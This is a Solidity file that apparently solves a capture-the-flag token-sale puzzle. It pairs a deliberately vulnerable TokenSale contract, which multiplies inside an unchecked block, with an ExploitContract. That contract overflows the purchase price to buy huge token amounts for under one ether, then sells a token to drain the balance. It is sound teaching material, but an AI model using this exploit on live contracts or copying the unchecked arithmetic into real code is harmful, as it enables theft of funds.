// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/console.sol";

contract TokenSale {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    constructor() payable {
        require(msg.value == 1 ether, "Requires 1 ether to deploy contract");
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable returns (uint256) {
        uint256 total = 0;
        unchecked {
            total += numTokens * PRICE_PER_TOKEN;
        }
        require(msg.value == total);
        balanceOf[msg.sender] += numTokens;
        return (total);
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);
        balanceOf[msg.sender] -= numTokens;
        (bool ok,) = msg.sender.call{value: (numTokens * PRICE_PER_TOKEN)}("");
        require(ok, "Transfer to msg.sender failed");
    }
}

/// We need to determine the number of tokens to buy in order to cause overflow in buy function.
/// The maximum value a uint256 can hold is 2^256 - 1.
/// We want to find the maximum value of numTokens such that when multiplied by the price per token (1 ether), the result does not exceed the maximum value a uint256 can hold.
/// If we divide the maximum value a uint256 can hold by the price per token (1 ether), we get the maximum number of tokens that can be bought without causing an overflow.
/// This is because multiplying this maximum number of tokens by the price per token (1 ether) should still give a value less than or equal to the maximum value a uint256 can hold.
/// So, by dividing 2^256 - 1 by 1 ether, we get the maximum number of tokens that can be bought without causing an overflow.
/// Adding 1 to this value ensures that an overflow will occur when calculating the total, allowing the attacker to exploit the contract.

contract ExploitContract {
    TokenSale public tokenSale;
    bool flag;

    constructor(TokenSale _tokenSale) {
        tokenSale = _tokenSale;
    }

    receive() external payable {}

    function exploit() external {
        uint256 PRICE_PER_TOKEN = 1 ether;
        uint256 numTokens;
        uint256 ethToSend;
        uint256 maxNumTokens;
        // the maximum value of numTokens that, when multiplied by the price per token, does not cause an overflow.
        maxNumTokens = type(uint256).max / PRICE_PER_TOKEN;
        // Adding 1 to this value ensures that an overflow will occur when calculating the total, allowing the attacker to exploit the contract.
        numTokens = maxNumTokens + 1;
        console.log(numTokens); // 115792089237316195423570985008687907853269984665640564039458
        unchecked {
            ethToSend = numTokens * PRICE_PER_TOKEN; //0.415992086870360064
        }
        tokenSale.buy{value: ethToSend}(numTokens);
        tokenSale.sell(1);
        console.log(address(this).balance);
    }
}
